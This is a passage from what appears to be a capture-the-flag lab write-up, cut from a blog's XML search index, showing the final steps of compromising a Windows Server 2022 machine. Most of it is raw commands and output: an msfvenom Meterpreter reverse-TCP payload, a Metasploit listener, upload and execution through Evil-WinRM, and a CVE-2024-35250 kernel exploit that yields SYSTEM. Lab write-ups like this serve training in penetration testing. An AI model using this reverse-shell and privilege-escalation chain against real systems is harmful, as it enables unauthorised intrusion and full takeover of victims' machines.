konoha# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=32002 -f exe &gt; pga.exe[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payloadNo encoder specified, outputting raw payloadPayload size: 510 bytesFinal size of exe file: 7680 bytes
Then setup our listener on msfconsole
msf exploit(windows/local/cve_2024_35250_ks_driver) &gt; use exploit/multi/handler[*] Using configured payload windows/x64/meterpreter/reverse_tcpmsf exploit(multi/handler) &gt;msf exploit(multi/handler) &gt; optionsPayload options (windows/x64/meterpreter/reverse_tcp):   Name      Current Setting  Required  Description   ----      ---------------  --------  -----------   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)   LHOST     tun0             yes       The listen address (an interface may be specified)   LPORT     32002            yes       The listen portExploit target:   Id  Name   --  ----   0   Wildcard TargetView the full module info with the info, or info -d command.msf exploit(multi/handler) &gt; run -j[*] Exploit running as background job 2.[*] Exploit completed, but no session was created.[*] Started reverse TCP handler on 10.200.21.53:32002

Finally, we can upload and execute.
*Evil-WinRM* PS C:\Users\alice.wonderland\Documents&gt; upload pga.exe*Evil-WinRM* PS C:\Users\alice.wonderland\Documents&gt; start pga.exe

And back on our machine.
msf exploit(multi/handler) &gt;[*] Sending stage (230982 bytes) to 10.0.21.159[*] Meterpreter session 5 opened (10.200.21.53:32002 -&gt; 10.0.21.159:54023) at 2025-11-23 18:57:41 -0600msf exploit(multi/handler) &gt; sessions -i 5[*] Starting interaction with 5...meterpreter &gt; getuidServer username: HACK\alice.wonderland

I bet you already knew about this ðŸ˜Looking for juciy vulnerabilities.
meterpreter &gt; run post/multi/recon/local_exploit_suggester[*] 10.0.21.159 - Collecting local exploits for x64/windows...[*] Collecting exploit 751 / 2568

After this gave back output, we find that there are many we can try. This kernel exploit worked just perfectly.
msf exploit(windows/local/cve_2024_35250_ks_driver) &gt; run[*] Started reverse TCP handler on 10.200.21.53:4444[*] Running automatic check (&quot;set AutoCheck false&quot; to disable)[+] The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2022[*] Launching notepad to host the exploit...[*] The notepad path is: C:\Windows\System32\notepad.exe[*] The notepad pid is: 6704[*] Reflectively injecting the DLL into 6704...[*] Sending stage (230982 bytes) to 10.0.21.159[*] Meterpreter session 4 opened (10.200.21.53:4444 -&gt; 10.0.21.159:51034) at 2025-11-23 16:09:08 -0600meterpreter &gt; getuidServer username: NT AUTHORITY\SYSTEM


]]></content>
      <categories>
        <category>hacksmarter</category>
      </categories>
      <tags>
        <tag>SMB</tag>
        <tag>GenericAll</tag>
        <tag>ntlmtheft</tag>
        <tag>Windows Kernel LPE</tag>
      </tags>
  </entry>
</search>
